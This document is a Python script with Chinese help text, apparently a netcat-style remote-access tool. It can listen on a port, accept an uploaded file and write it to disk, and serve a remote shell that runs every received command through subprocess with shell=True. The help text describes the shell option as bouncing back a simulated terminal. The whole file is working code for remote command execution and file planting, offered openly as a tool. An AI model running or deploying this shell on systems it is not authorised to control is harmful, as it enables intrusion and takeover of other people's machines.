# -*- coding: utf-8 -*-
#!/usr/bin/python3

import sys
import socket
import argparse
import threading
import subprocess

parser = argparse.ArgumentParser(description='使用说明')
parser.add_argument('-l','--listen',action='store_true',help='启动监听模式')
parser.add_argument('-c','--command',action='store_true',help='反弹一个模拟终端')
parser.add_argument('-w','--write', help='服务端写入一个文件，后跟新建的文件名')
parser.add_argument('-t','--target', default='0.0.0.0', help='将要连接的主机IP、默认监听 0.0.0.0')
parser.add_argument('-p','--port', default='4444', help='将要监听或连接的端口')
parser.add_argument('-up','--up', help='客户端上传一个文件，后跟文件名')

args    = parser.parse_args()

listen  = args.listen
command = args.command
target  = args.target
port    = int(args.port)
write  = args.write
up      = args.up

def client_sender():
	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		client.connect((target,port))		
		while True:
			global up
			if not up:
				ssin = sys.stdin.readline()
			if up:
				ssin = open( up,'rb').read()
				client.send(ssin)
			elif len(ssin):
				client.send(bytes(ssin,encoding='utf-8'))			
			response = ""
			while True:
				data     = client.recv(4096)
				recv_len = len(data)
				response += str(data,encoding='gbk')
				if recv_len < 4096:
					break
			print(response)
			if "成功将文件写入到" in response:				
				up = None
				print("已反弹一个模拟终端、请输入命令:\r\n")
	except Exception as e:
		print('[*] Exception! Exiting.\n%s' % e)
		client.close()

def server_loop():
	global command
	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	server.bind((target,port))
	server.listen(5)
	print("[*] 监听在：[{}:{}]!".format(target, port))

	while True:
		client_socket, addr = server.accept()
		print('[+] 建立一个连接： %s:%s' % (addr[0],addr[1]))
		# try:
		# 	client_handler(client_socket)
		# except Exception as e:
		# 	print(e)

		# 分拆一个线程处理新的客户端
		client_thead = threading.Thread(target=client_handler, args=(client_socket,))
		client_thead.start()

def run_command(command):
	command = command.rstrip()
	try:
		output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
	except Exception as e:
		output = bytes("执行命令出错\n%s\r\n" % e,encoding='gbk')
	return output

def client_handler(client_socket):
	global command
	if write:
		file_buffer = b""
		while True:
			data = client_socket.recv(1024)
			file_buffer += data
			if len(data) < 1024:
				break
		try:
			file_descriptor = open(write,'wb')
			file_descriptor.write(file_buffer)
			file_descriptor.close()
			client_socket.send(bytes('成功将文件写入到%s\r\n' % write,encoding='gbk'))
			command = True
		except Exception as e:
			client_socket.send(bytes('无法将文件保存到%s\n%s\r\n' % (write,e),encoding='gbk'))

	if command:
		while True:
			cmd_buffer = ''
			while '\n' not in cmd_buffer:
				cmd_buffer += str(client_socket.recv(1024),encoding='utf-8')

			if cmd_buffer:
				response = run_command(cmd_buffer)
			if response == b"":
				response = b"\n"
			client_socket.send(response)

if not listen:
	client_sender()
if listen:
	server_loop()